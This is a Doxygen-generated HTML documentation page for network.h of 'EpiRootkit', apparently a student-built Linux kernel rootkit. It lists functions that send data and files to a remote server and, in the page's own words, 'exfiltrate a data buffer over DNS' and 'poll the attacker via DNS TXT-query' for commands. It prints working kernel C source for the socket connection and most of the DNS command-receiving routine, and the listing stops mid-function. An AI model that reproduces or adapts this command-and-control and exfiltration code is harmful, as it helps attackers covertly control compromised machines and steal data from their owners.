<!-- HTML header for doxygen 1.13.2-->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=11"/>
<meta name="generator" content="Doxygen 1.9.8"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>EpiRootkit: network.h File Reference</title>
<!--BEGIN PROJECT_ICON-->
<link rel="icon" href="../../$projecticon" type="image/x-icon" />
<!--END PROJECT_ICON-->
<link href="../../tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../jquery.js"></script>
<script type="text/javascript" src="../../dynsections.js"></script>
<!--BEGIN COPY_CLIPBOARD-->
<script type="text/javascript" src="../../clipboard.js"></script>
<!--END COPY_CLIPBOARD-->
<link href="../../navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../resize.js"></script>
<script type="text/javascript" src="../../navtreedata.js"></script>
<script type="text/javascript" src="../../navtree.js"></script>
<link href="../../search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="../../search/searchdata.js"></script>
<script type="text/javascript" src="../../search/search.js"></script>
<link href="../../doxygen.css" rel="stylesheet" type="text/css" />
<link href="../../doxygen-awesome.css" rel="stylesheet" type="text/css"/>
  <script type="text/javascript" src="../../doxygen-awesome-darkmode-toggle.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeDarkModeToggle.init()
    </script>
  <script type="text/javascript" src="../../doxygen-awesome-interactive-toc.js"></script>
    <script type="text/javascript">
      DoxygenAwesomeInteractiveToc.init()
      DoxygenAwesomeInteractiveToc.hideMobileMenu = false
      DoxygenAwesomeInteractiveToc.topOffset = 45
  </script>
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr id="projectrow">
  <td id="projectlogo"><img alt="Logo" src="../../logo_no_text.png"$logosize/></td>
  <td id="projectalign">
   <div id="projectname">EpiRootkit
   </div>
   <div id="projectbrief">Par STDBOOL</div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.9.8 -->
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
var searchBox = new SearchBox("searchBox", "../../search/",'.html');
/* @license-end */
</script>
<script type="text/javascript" src="../../menudata.js"></script>
<script type="text/javascript" src="../../menu.js"></script>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(function() {
  initMenu('../../',true,false,'search.php','Search');
  $(document).ready(function() { init_search(); });
});
/* @license-end */
</script>
<div id="main-nav"></div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
/* @license magnet:?xt=urn:btih:d3d9a9a6595521f9666a5e94cc830dab83b65699&amp;dn=expat.txt MIT */
$(document).ready(function(){initNavTree('d9/d94/network_8h.html','../../'); initResizable(); });
/* @license-end */
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<div id="MSearchResults">
<div class="SRPage">
<div id="SRIndex">
<div id="SRResults"></div>
<div class="SRStatus" id="Loading">Loading...</div>
<div class="SRStatus" id="Searching">Searching...</div>
<div class="SRStatus" id="NoMatches">No Matches</div>
</div>
</div>
</div>
</div>

<div class="header">
  <div class="summary">
<a href="#func-members">Functions</a>  </div>
  <div class="headertitle"><div class="title">network.h File Reference</div></div>
</div><!--header-->
<div class="contents">
<div class="textblock"><code>#include &lt;linux/delay.h&gt;</code><br />
<code>#include &lt;linux/errno.h&gt;</code><br />
<code>#include &lt;linux/fcntl.h&gt;</code><br />
<code>#include &lt;linux/in.h&gt;</code><br />
<code>#include &lt;linux/inet.h&gt;</code><br />
<code>#include &lt;linux/kthread.h&gt;</code><br />
<code>#include &lt;linux/module.h&gt;</code><br />
<code>#include &lt;linux/mutex.h&gt;</code><br />
<code>#include &lt;linux/net.h&gt;</code><br />
<code>#include &lt;linux/random.h&gt;</code><br />
<code>#include &lt;linux/socket.h&gt;</code><br />
<code>#include &lt;linux/uio.h&gt;</code><br />
<code>#include &quot;<a class="el" href="../../db/d16/config_8h_source.html">config.h</a>&quot;</code><br />
<code>#include &quot;<a class="el" href="../../da/da0/crypto_8h_source.html">crypto.h</a>&quot;</code><br />
<code>#include &quot;<a class="el" href="../../dd/d9f/cmd_8h_source.html">cmd.h</a>&quot;</code><br />
</div><div class="textblock"><div class="dynheader">
Include dependency graph for network.h:</div>
<div class="dyncontent">
<div class="center"><!-- SVG 0 --></div>
</div>
</div><div class="textblock"><div class="dynheader">
This graph shows which files directly or indirectly include this file:</div>
<div class="dyncontent">
<div class="center"><!-- SVG 1 --></div>
</div>
</div>
<p><a href="../../d9/d94/network_8h_source.html">Go to the source code of this file.</a></p>
<table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a id="func-members" name="func-members"></a>
Functions</h2></td></tr>
<tr class="memitem:a57b1c96d9aa9b9d9453d0dca6a7c3b87" id="r_a57b1c96d9aa9b9d9453d0dca6a7c3b87"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a57b1c96d9aa9b9d9453d0dca6a7c3b87">send_to_server_raw</a> (const char *data, size_t len)</td></tr>
<tr class="separator:a57b1c96d9aa9b9d9453d0dca6a7c3b87"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a375e772b2efc7540285ea61d2c9e5694" id="r_a375e772b2efc7540285ea61d2c9e5694"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a375e772b2efc7540285ea61d2c9e5694">send_to_server</a> (enum <a class="el" href="../../db/d16/config_8h.html#aac39b55be6469395f55ff0292ad8184c">Protocol</a> protocol, char *<a class="el" href="../../db/d16/config_8h.html#a0b2e8c7f76df48129f994ecc46d5c66c">message</a>,...)</td></tr>
<tr class="separator:a375e772b2efc7540285ea61d2c9e5694"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab8398f09feb91fd48c40520303c273b1" id="r_ab8398f09feb91fd48c40520303c273b1"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#ab8398f09feb91fd48c40520303c273b1">receive_from_server</a> (char *buffer, size_t len)</td></tr>
<tr class="separator:ab8398f09feb91fd48c40520303c273b1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abcb7f2b3978815223754a91b930e28ee" id="r_abcb7f2b3978815223754a91b930e28ee"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#abcb7f2b3978815223754a91b930e28ee">send_file_to_server</a> (char *filename)</td></tr>
<tr class="separator:abcb7f2b3978815223754a91b930e28ee"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6e4500656cc3e4933c0d6dc0507f0696" id="r_a6e4500656cc3e4933c0d6dc0507f0696"><td class="memItemLeft" align="right" valign="top">struct socket *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a6e4500656cc3e4933c0d6dc0507f0696">get_worker_socket</a> (void)</td></tr>
<tr class="separator:a6e4500656cc3e4933c0d6dc0507f0696"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad220908f5c1a61f29e2368c8db61f288" id="r_ad220908f5c1a61f29e2368c8db61f288"><td class="memItemLeft" align="right" valign="top">struct socket *&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#ad220908f5c1a61f29e2368c8db61f288">set_worker_socket</a> (struct socket *s)</td></tr>
<tr class="separator:ad220908f5c1a61f29e2368c8db61f288"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a295724b006015077ff26ce0862d7f243" id="r_a295724b006015077ff26ce0862d7f243"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a295724b006015077ff26ce0862d7f243">close_worker_socket</a> (void)</td></tr>
<tr class="separator:a295724b006015077ff26ce0862d7f243"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3440590c309505a5d78c9673eccd5bd2" id="r_a3440590c309505a5d78c9673eccd5bd2"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a3440590c309505a5d78c9673eccd5bd2">connect_worker_socket_to_server</a> (struct sockaddr_in *addr)</td></tr>
<tr class="separator:a3440590c309505a5d78c9673eccd5bd2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af3cb573e06b73626a72c113f34ec7340" id="r_af3cb573e06b73626a72c113f34ec7340"><td class="memItemLeft" align="right" valign="top">bool&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#af3cb573e06b73626a72c113f34ec7340">is_user_auth</a> (void)</td></tr>
<tr class="separator:af3cb573e06b73626a72c113f34ec7340"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a043850404f54dbb1abc14ad658528669" id="r_a043850404f54dbb1abc14ad658528669"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a043850404f54dbb1abc14ad658528669">set_user_auth</a> (bool auth)</td></tr>
<tr class="separator:a043850404f54dbb1abc14ad658528669"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2854e06612012f03c99698168e68c14f" id="r_a2854e06612012f03c99698168e68c14f"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a2854e06612012f03c99698168e68c14f">start_network_worker</a> (void)</td></tr>
<tr class="separator:a2854e06612012f03c99698168e68c14f"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af4b33ff003ec81aed0790bfcf426a025" id="r_af4b33ff003ec81aed0790bfcf426a025"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#af4b33ff003ec81aed0790bfcf426a025">stop_network_worker</a> (void)</td></tr>
<tr class="separator:af4b33ff003ec81aed0790bfcf426a025"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1f3fd0d4b58aa92d0cf7a54c4af03671" id="r_a1f3fd0d4b58aa92d0cf7a54c4af03671"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a1f3fd0d4b58aa92d0cf7a54c4af03671">dns_send_data</a> (const char *data, size_t len)</td></tr>
<tr class="memdesc:a1f3fd0d4b58aa92d0cf7a54c4af03671"><td class="mdescLeft">&#160;</td><td class="mdescRight">Exfiltrate a data buffer over DNS by hex-chunked A-queries.  <br /></td></tr>
<tr class="separator:a1f3fd0d4b58aa92d0cf7a54c4af03671"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a09e9c16fc7b47ed89818ee2a68368871" id="r_a09e9c16fc7b47ed89818ee2a68368871"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a09e9c16fc7b47ed89818ee2a68368871">dns_receive_command</a> (char *buffer, size_t max_len)</td></tr>
<tr class="memdesc:a09e9c16fc7b47ed89818ee2a68368871"><td class="mdescLeft">&#160;</td><td class="mdescRight">Poll the attacker via DNS TXT-query for a pending command.  <br /></td></tr>
<tr class="separator:a09e9c16fc7b47ed89818ee2a68368871"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a344ccb7255b813ec1e3ab4a5834f2898" id="r_a344ccb7255b813ec1e3ab4a5834f2898"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a344ccb7255b813ec1e3ab4a5834f2898">start_dns_worker</a> (void)</td></tr>
<tr class="memdesc:a344ccb7255b813ec1e3ab4a5834f2898"><td class="mdescLeft">&#160;</td><td class="mdescRight">Starts the DNS worker kernel thread.  <br /></td></tr>
<tr class="separator:a344ccb7255b813ec1e3ab4a5834f2898"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a64dda46c83f292c9877938a32e7576b7" id="r_a64dda46c83f292c9877938a32e7576b7"><td class="memItemLeft" align="right" valign="top">int&#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="../../d9/d94/network_8h.html#a64dda46c83f292c9877938a32e7576b7">stop_dns_worker</a> (void)</td></tr>
<tr class="memdesc:a64dda46c83f292c9877938a32e7576b7"><td class="mdescLeft">&#160;</td><td class="mdescRight">Stops the DNS worker kernel thread.  <br /></td></tr>
<tr class="separator:a64dda46c83f292c9877938a32e7576b7"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table>
<h2 class="groupheader">Function Documentation</h2>
<a id="a295724b006015077ff26ce0862d7f243" name="a295724b006015077ff26ce0862d7f243"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a295724b006015077ff26ce0862d7f243">&#9670;&#160;</a></span>close_worker_socket()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int close_worker_socket </td>
          <td>(</td>
          <td class="paramtype">void&#160;</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>close_worker_socket - Closes the worker socket. Return: 0 on success, or an error code on failure. </p>

<p class="definition">Definition at line <a class="el" href="../../d5/df8/socket_8c_source.html#l00043">43</a> of file <a class="el" href="../../d5/df8/socket_8c_source.html">socket.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   43</span>                              {</div>
<div class="line"><span class="lineno">   44</span>    mutex_lock(&amp;worker_socket_lock);</div>
<div class="line"><span class="lineno">   45</span>    <span class="keywordflow">if</span> (<a class="code hl_variable" href="../../d5/df8/socket_8c.html#accf533866962c2f9ee4d79654fc337d0">worker_socket</a>) {</div>
<div class="line"><span class="lineno">   46</span>        sock_release(<a class="code hl_variable" href="../../d5/df8/socket_8c.html#accf533866962c2f9ee4d79654fc337d0">worker_socket</a>);</div>
<div class="line"><span class="lineno">   47</span>        <a class="code hl_variable" href="../../d5/df8/socket_8c.html#accf533866962c2f9ee4d79654fc337d0">worker_socket</a> = NULL;</div>
<div class="line"><span class="lineno">   48</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;close_worker_socket: socket released\n&quot;</span>);</div>
<div class="line"><span class="lineno">   49</span>    }</div>
<div class="line"><span class="lineno">   50</span>    mutex_unlock(&amp;worker_socket_lock);</div>
<div class="line"><span class="lineno">   51</span>    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line"><span class="lineno">   52</span>}</div>
<div class="ttc" id="aconfig_8h_html_a317bf780ec5da5b783e9979da34a878d"><div class="ttname"><a href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a></div><div class="ttdeci">#define DBG_MSG(fmt, args...)</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00015">config.h:15</a></div></div>
<div class="ttc" id="aconfig_8h_html_aa90cac659d18e8ef6294c7ae337f6b58"><div class="ttname"><a href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a></div><div class="ttdeci">#define SUCCESS</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00005">config.h:5</a></div></div>
<div class="ttc" id="asocket_8c_html_accf533866962c2f9ee4d79654fc337d0"><div class="ttname"><a href="../../d5/df8/socket_8c.html#accf533866962c2f9ee4d79654fc337d0">worker_socket</a></div><div class="ttdeci">static struct socket * worker_socket</div><div class="ttdef"><b>Definition</b> <a href="../../d5/df8/socket_8c_source.html#l00010">socket.c:10</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a3440590c309505a5d78c9673eccd5bd2" name="a3440590c309505a5d78c9673eccd5bd2"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a3440590c309505a5d78c9673eccd5bd2">&#9670;&#160;</a></span>connect_worker_socket_to_server()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int connect_worker_socket_to_server </td>
          <td>(</td>
          <td class="paramtype">struct sockaddr_in *&#160;</td>
          <td class="paramname"><em>addr</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">
<p>connect_worker_socket_to_server - Connects the worker socket to the server. </p><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">addr</td><td>The server address to connect to. Return: 0 on success, or a negative error code on failure. </td></tr>
  </table>
  </dd>
</dl>

<p class="definition">Definition at line <a class="el" href="../../d5/df8/socket_8c_source.html#l00059">59</a> of file <a class="el" href="../../d5/df8/socket_8c_source.html">socket.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">   59</span>                                                              {</div>
<div class="line"><span class="lineno">   60</span>    <span class="keywordtype">int</span> ret;</div>
<div class="line"><span class="lineno">   61</span>    <span class="keyword">struct </span>socket *s;</div>
<div class="line"><span class="lineno">   62</span> </div>
<div class="line"><span class="lineno">   63</span>    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &amp;s);</div>
<div class="line"><span class="lineno">   64</span>    <span class="keywordflow">if</span> (ret &lt; 0) {</div>
<div class="line"><span class="lineno">   65</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;connect_worker_socket: failed to create socket (ret=%d)\n&quot;</span>, ret);</div>
<div class="line"><span class="lineno">   66</span>        <span class="keywordflow">return</span> ret;</div>
<div class="line"><span class="lineno">   67</span>    }</div>
<div class="line"><span class="lineno">   68</span> </div>
<div class="line"><span class="lineno">   69</span>    ret = kernel_connect(s, (<span class="keyword">struct</span> sockaddr *)addr, <span class="keyword">sizeof</span>(*addr), 0);</div>
<div class="line"><span class="lineno">   70</span>    <span class="keywordflow">if</span> (ret &lt; 0) {</div>
<div class="line"><span class="lineno">   71</span>        <a class="code hl_define" href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a>(<span class="stringliteral">&quot;connect_worker_socket: connection failed (ret=%d)\n&quot;</span>, ret);</div>
<div class="line"><span class="lineno">   72</span>        sock_release(s);</div>
<div class="line"><span class="lineno">   73</span>        <span class="keywordflow">return</span> ret;</div>
<div class="line"><span class="lineno">   74</span>    }</div>
<div class="line"><span class="lineno">   75</span> </div>
<div class="line"><span class="lineno">   76</span>    <a class="code hl_function" href="../../d5/df8/socket_8c.html#ad220908f5c1a61f29e2368c8db61f288">set_worker_socket</a>(s);</div>
<div class="line"><span class="lineno">   77</span>    <a class="code hl_define" href="../../db/d16/config_8h.html#a317bf780ec5da5b783e9979da34a878d">DBG_MSG</a>(<span class="stringliteral">&quot;connect_worker_socket: connection successful\n&quot;</span>);</div>
<div class="line"><span class="lineno">   78</span>    <span class="keywordflow">return</span> <a class="code hl_define" href="../../db/d16/config_8h.html#aa90cac659d18e8ef6294c7ae337f6b58">SUCCESS</a>;</div>
<div class="line"><span class="lineno">   79</span>}</div>
<div class="ttc" id="aconfig_8h_html_a28aac7cd72bc6ccb4340f7985d0d5449"><div class="ttname"><a href="../../db/d16/config_8h.html#a28aac7cd72bc6ccb4340f7985d0d5449">ERR_MSG</a></div><div class="ttdeci">#define ERR_MSG(fmt, args...)</div><div class="ttdef"><b>Definition</b> <a href="../../db/d16/config_8h_source.html#l00016">config.h:16</a></div></div>
<div class="ttc" id="asocket_8c_html_ad220908f5c1a61f29e2368c8db61f288"><div class="ttname"><a href="../../d5/df8/socket_8c.html#ad220908f5c1a61f29e2368c8db61f288">set_worker_socket</a></div><div class="ttdeci">struct socket * set_worker_socket(struct socket *s)</div><div class="ttdef"><b>Definition</b> <a href="../../d5/df8/socket_8c_source.html#l00030">socket.c:30</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a id="a09e9c16fc7b47ed89818ee2a68368871" name="a09e9c16fc7b47ed89818ee2a68368871"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a09e9c16fc7b47ed89818ee2a68368871">&#9670;&#160;</a></span>dns_receive_command()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int dns_receive_command </td>
          <td>(</td>
          <td class="paramtype">char *&#160;</td>
          <td class="paramname"><em>out_buffer</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">size_t&#160;</td>
          <td class="paramname"><em>max_length</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Poll the attacker via DNS TXT-query for a pending command. </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">out_buffer</td><td>Buffer to store received command string. </td></tr>
    <tr><td class="paramname">max_length</td><td>Maximum size of <code>out_buffer</code>. </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>Length of command received (&gt;0), 0 if none, negative on error. </dd></dl>

<p class="definition">Definition at line <a class="el" href="../../d9/d54/dns_8c_source.html#l00222">222</a> of file <a class="el" href="../../d9/d54/dns_8c_source.html">dns.c</a>.</p>
<div class="fragment"><div class="line"><span class="lineno">  222</span>                                                             {</div>
<div class="line"><span class="lineno">  223</span>    <span class="keywordtype">char</span> *poll_qname;</div>
<div class="line"><span class="lineno">  224</span>    u8 *response_buffer_local;</div>
<div class="line"><span class="lineno">  225</span>    <span class="keywordtype">int</span> response_length_local;</div>
<div class="line"><span class="lineno">  226</span>    <span class="keywordtype">int</span> result;</div>
<div class="line"><span class="lineno">  227</span>    <span class="keyword">struct </span><a class="code hl_struct" href="../../de/dd9/structdns__header__t.html">dns_header_t</a> *hdr;</div>
<div class="line"><span class="lineno">  228</span>    u16 answer_count;</div>
<div class="line"><span class="lineno">  229</span>    <span class="keywordtype">int</span> offset;</div>
<div class="line"><span class="lineno">  230</span> </div>
<div class="line"><span class="lineno">  231</span>    <span class="comment">// Allocate local response buffer</span></div>
<div class="line"><span class="lineno">  232</span>    response_buffer_local = kzalloc(<a class="code hl_define" href="../../db/d16/config_8h.html#aa1a62a1468067c7b022a024325225702">DNS_MAX_BUF</a>, GFP_KERNEL);</div>
<div class="line"><span class="lineno">  233</span>    <span class="keywordflow">if</span> (!response_buffer_local)</div>
<div class="line"><span class="lineno">  234</span>        <span class="keywordflow">return</span> -ENOMEM;</div>
<div class="line"><span class="lineno">  235</span> </div>
<div class="line"><span class="lineno">  236</span>    <span class="comment">// Build the TXT-poll query name</span></div>
<div class="line"><span class="lineno">  237</span>    poll_qname = kmalloc(128, GFP_KERNEL);</div>
<div class="line"><span class="lineno">  238</span>    snprintf(poll_qname, 128, <span class="stringliteral">&quot;command.%s&quot;</span>, <a class="code hl_define" href="../../db/d16/config_8h.html#a62787143a36288db9af243c8bec2aa3b">DNS_DOMAIN</a>);</div>
<div class="line"><span class="lineno">  239</span> </div>
<div class="line"><span class="lineno">  240</span>    <span class="comment">// Send TXT query and get raw response</span></div>
<div class="line"><span class="lineno">  241</span>    result = <a class="code hl_function" href="../../d9/d54/dns_8c.html#af4fa4cede0d5ee503bc605138fea7da2">dns_send_query</a>(poll_qname, htons(16), response_buffer_local,</div>
<div class="line"><span class="lineno">  242</span>                            &amp;response_length_local);</div>
<div class="line"><span class="lineno">  243</span>    kfree(poll_qname);</div>
<div class="line"><span class="lineno">  244</span>    <span class="keywordflow">if</span> (result &lt; 0) {</div>
<div class="line"><span class="lineno">  245</span>        kfree(response_buffer_local);</div>
<div class="line"><span class="lineno">  246</span>        <span class="keywordflow">return</span> -EIO;</div>
<div class="line"><span class="lineno">  247</span>    }</div>
<div class="line"><span class="lineno">  248</span> </div>
<div class="line"><span class="lineno">  249</span>    <span class="comment">// Parse DNS header and answer count</span></div>
<div class="line"><span class="lineno">  250</span>    hdr = (<span class="keyword">struct </span><a class="code hl_struct" href="../../de/dd9/structdns__header__t.html">dns_header_t</a> *)response_buffer_local;</div>
<div class="line"><span class="lineno">  251</span>    answer_count = ntohs(hdr-&gt;<a class="code hl_variable" href="../../de/dd9/structdns__header__t.html#acb0a9a6e729d7ba375297cf625fc938b">ancount</a>);</div>
<div class="line"><span class="lineno">  252</span> </div>
<div class="line"><span class="lineno">  253</span>    <span class="comment">// No command pending</span></div>
<div class="line"><span class="lineno">  254</span>    <span class="keywordflow">if</span> (answer_count == 0) {</div>
<div class="line"><span class="lineno">  255</span>        kfree(response_buffer_local);</div>
<div class="line"><span class="lineno">  256</span>        <span class="keywordflow">return</span> 0;</div>
<div class="line"><span class="lineno">  257</span>    }</div>
<div class="line"><span class="lineno">  258</span> </div>
<div class="line"><span class="lineno">  259</span>    <span class="comment">// Skip header and question section</span></div>
<div class="line"><span class="lineno">  260</span>    offset = <a class="code hl_define" href="../../db/d16/config_8h.html#ab45c21ad55157cd53ce4c58d5b7b449f">DNS_HDR_SIZE</a>;</div>
<div class="line"><span class="lineno">  261</span>    <span class="keywordflow">while</span> (offset &lt; response_length_local &amp;&amp; response_buffer_local[offset])</div>
<div class="line"><span class="lineno">  262</span>        offset += response_buffer_local[offset] + 1;</div>
<div class="line"><span class="lineno">  263</span> </div>
<div class="line"><span class="lineno">  264</span>    <span class="comment">// NULL (1) + QTYPE (2) + QCLASS (2)</span></div>
<div class="line"><span class="lineno">  265</span>    offset += 1 + 2 + 2;</div>
<div class="line"><span class="lineno">  266</span> </div>
<div class="line"><span class="lineno">  267</span>    <span class="comment">// Skip into first answer record</span></div>
<div class="line"><span class="lineno">  268</span>    <span class="keywordflow">if</span> ((response_buffer_local[offset] &amp; 0xC0) == 0xC0)</div>
<div class="line"><span class="lineno">  269</span>        offset += 2;</div>
<div class="line"><span class="lineno">  270</span>    <span class="keywordflow">else</span> {</div>
<div class="line"><span class="lineno">  271</span>        <span class="keywordflow">while</span> (offset &lt; response_length_local &amp;&amp; response_buffer_local[offset])</div>
<div class="line"><span class="lineno">  272</span>            offset += response_buffer_local[offset] + 1;</div>
<div class="line"><span class="lineno">  273</span>        offset++;</div>
<div class="line"><span class="lineno">  274</span>    }</div>
<div class="line"><span class="lineno">  275</span> </div>
<div class="line"><span class="lineno">  276</span>    <span class="comment">// TYPE (2) + CLASS (2) + TTL (4)</span></div>
<div class="line"><span class="lineno">  277</span>    offset += 2 + 2 + 4;</div>
<div class="line"><span class="lineno">  278</span> </div>
<div class="line"><span class="lineno">  279</span>    <span class="comment">// Read RDLENGTH and TXT length byte</span></div>
<div class="line"><span class="lineno">  280</span>    u16 rdlength = ntohs(*(__be16 *)(response_buffer_local + offset));</div>
<div class="line"><span class="lineno">  281</span>    offset += 2;</div>
<div class="line"><span class="lineno">  282</span> </div>
<div class="line"><span class="lineno">  283</span>    <span class="keywordflow">if</span> (rdlength &gt; 0 &amp;&amp; offset &lt; response_length_local) {</div>
<div class="line"><span class="lineno">  284</span>        u8 txt_length = response_buffer_local[offset++];</div>
<div class="line"><span class="lineno">  285</span>        <span class="keywordflow">if</span> (txt_length &gt;= max_length)</div>
<div class="line"><span class="lineno">  286</span>            txt_length = max_length - 1;</div>
<div class="line"><span class="lineno">  287</span> </div>
<div class="line"><span class="lineno">  288</span>        <span class="keywordtype">char</span> *decrypted = NULL;</div>
<div class="line"><span class="lineno">  289</span>        <span class="keywordtype">size_t</span> decrypted_len = 0;</div>
<div class="line"><span class="lineno">  290</span> </div>
<div class="line"><span class="lineno">  291</span>        <span class="keywordflow">if</span> (<a class="code hl_function" href="../../dd/d34/aes_8c.html#a6bc241684ae62f3134aafe86eb44c2e2">decrypt_buffer</a>(response_buffer_local + offset, txt_length, &amp;decrypted,</div>
<div class="line"><span class="lineno">  292</span>                           &amp;decrypted_len)</div>
<div class="line"><span class="lineno">  293</span>            &lt; 0) {</div>
<div class="line"><span class="lineno">  294</span>            kfree(response_buffer_local);</div>
<div class="line"><span class="lineno">  295</span>            <span class="keywordflow">return</span> -EIO;</div>
<div class="line"><span class="lineno">  296</span>        }</div>
<div class="line"><span class="lineno">  297</span> </div>
<div class="line"><span class="lineno">  298</span>        memcpy(out_buffer, decrypted, decrypted_len);</div>
<div class="line"><span class="lineno">  299</span>        out_buffer[decrypted_len] = <span class="charliteral">&#39;\0&#39;</span>;</div>
<div class="line"><span class="lineno">  300</span> </div>
